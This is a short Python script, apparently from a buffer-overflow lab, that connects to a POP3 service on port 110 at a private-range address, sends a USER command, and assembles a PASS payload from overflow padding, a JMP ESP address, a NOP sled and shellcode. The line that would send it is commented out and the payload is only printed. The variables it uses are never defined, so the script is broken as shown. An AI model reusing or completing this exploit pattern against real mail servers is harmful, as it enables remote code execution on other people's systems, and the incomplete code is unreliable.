#! /usr/bin/python3
## This program sends a string to host to verify the finding on position of EIP 
## All the IP address, port number, amount of A, and shellcode are hard-coded. 

import socket




s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Sending the string...')
s.connect(('192.168.56.109',110))
s.recv(1024)
s.send('USER TEST' +'\n')
s.recv(1024)
#s.send(PASS.encode() + string.encode() + jmpesp.encode('latin-1')+ nop.encode('latin-1')+shellcode.encode('latin-1')+newline.encode())
test=(PASS.encode() + string.encode() + jmpesp.encode('latin-1')+ nop.encode('latin-1')+shellcode.encode('latin-1')+newline.encode())
print(test)

